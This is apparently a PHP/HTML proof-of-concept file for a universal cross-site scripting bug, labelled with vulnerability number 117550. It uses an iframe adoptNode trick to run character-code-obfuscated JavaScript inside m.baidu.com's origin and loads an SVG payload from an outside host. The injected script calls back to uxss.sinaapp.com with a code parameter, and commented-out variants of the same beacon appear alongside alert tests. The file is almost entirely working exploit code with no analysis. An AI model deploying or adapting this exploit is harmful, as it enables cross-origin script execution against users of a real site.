<?php
//漏洞编号:117550
$code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
//$str = "if(document.domain == 'm.baidu.com'){new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=5'}";
//$str = "if(document.domain == 'm.baidu.com'){new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=5';}";
//$str = "if(document.domain == 'm.baidu.com'){alert(1)}";
$str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=5';}}";

$tmp = str_split($str);
$result = array();

foreach($tmp as $key => $value){
    $result[$key] = ord($value);
}

$input = implode(",", $result);

?>

<html>
<head>
<script>

main = function()
{
	specialFrame = document.body.appendChild(document.createElement("iframe"));

	document.adoptNode(specialFrame);
	document.implementation.createHTMLDocument().adoptNode(specialFrame);

	specialFrame.contentWindow.location = "http://m.baidu.com/";

	interval1 = setInterval(function() {
		if (specialFrame.contentDocument)
			return;
		clearInterval(interval1);

        specialFrame.src = "javascript:eval(String.fromCharCode(<?php echo $input; ?>))";
        //specialFrame.src = "javascript:alert(document.domain)";

		uxssFrame = document.body.appendChild(document.createElement("iframe"));
        uxssFrame.src = "http://uxss.sinaapp.com/poc/117550_1.svg";
	}, 100);
} 
</script>
</head>
<body onload="main()"></body>
</html>